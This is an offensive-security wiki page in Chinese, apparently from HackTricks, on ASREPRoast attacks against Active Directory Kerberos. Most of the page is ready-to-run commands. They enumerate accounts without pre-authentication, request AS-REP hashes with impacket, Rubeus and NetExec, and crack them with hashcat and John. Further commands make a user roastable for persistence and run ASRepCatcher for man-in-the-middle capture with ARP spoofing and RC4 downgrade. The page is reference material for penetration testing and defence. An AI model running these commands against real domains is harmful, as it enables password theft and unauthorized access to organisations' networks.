# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast 是一种 security attack，利用缺少 **Kerberos pre-authentication required attribute** 的用户。基本上，这个漏洞允许攻击者从 Domain Controller (DC) 请求某个用户的 authentication，而不需要该用户的密码。随后 DC 会返回一条使用该用户密码派生密钥加密的消息，攻击者可以尝试离线 crack 它来发现该用户的密码。

这种 attack 的主要要求是：

- **缺少 Kerberos pre-authentication**：目标用户不能启用这个安全功能。
- **连接到 Domain Controller (DC)**：攻击者需要能访问 DC，以发送请求并接收加密消息。
- **可选的 domain account**：拥有 domain account 可以让攻击者通过 LDAP queries 更高效地识别易受攻击的用户。没有这个 account 时，攻击者必须猜测 usernames。

#### 枚举 vulnerable users（需要 domain credentials）
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### 请求 AS_REP 消息
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus 默认请求 **RC4**，所以 Event ID **4768** 通常会显示 **preauth type 0** 和 **ticket encryption type 0x17**。如果你加上 **`/aes`**（或者目标禁用了 RC4），则会改为出现 **AES etypes**。

#### Quick one-liners (Linux)

- 先枚举潜在目标（例如，从泄漏的 build paths 中）使用 Kerberos userenum：`kerbrute userenum users.txt -d domain --dc dc.domain`
- 不使用有效凭据，直接用 NetExec 对整个用户名列表执行 roast：`netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- 如果你有凭据，让 NetExec 查询 LDAP 并为你请求每个可 roast 的账户：`netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- 如果输出以 **`$krb5asrep$23$`** 开头，用 Hashcat **`-m 18200`** 破解。如果以 **`$krb5asrep$17$`** 或 **`$krb5asrep$18$`** 开头，优先用 John **`--format=krb5asrep`**。

### Cracking

不要假设每个 AS-REP roast 都是 RC4。现代工具会根据请求/协商的 enctype 返回 **RC4**（`$krb5asrep$23$`）或 **AES**（`$krb5asrep$17$` / `$krb5asrep$18$`）。**`hashcat -m 18200`** 用于 **etype 23**，而 **John** 可直接处理 **17/18/23** 的 `krb5asrep`。
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### 持久化

对于你拥有 **GenericAll** 权限（或写入属性权限）的用户，强制使其不需要 **preauth**：
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## 无凭据 ASREProast

攻击者可以利用中间人位置，在 AS-REP 数据包穿越网络时捕获它们，而不依赖 Kerberos pre-authentication 被禁用。因此，它适用于 VLAN 上的所有用户。\
如果你想要相关的无凭据技巧，它会从一个 no-preauth principal 返回一个 **service ticket** 而不是 **TGT**，请参见 [Kerberoast](kerberoast.md)。

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 允许我们这样做。`relay` 模式在攻击上更有价值，因为当客户端仍然声明 **etype 23** 时，它可以强制使用 **RC4**；`listen` 则保持被动，只捕获客户端/DC 协商出的内容。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考资料

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
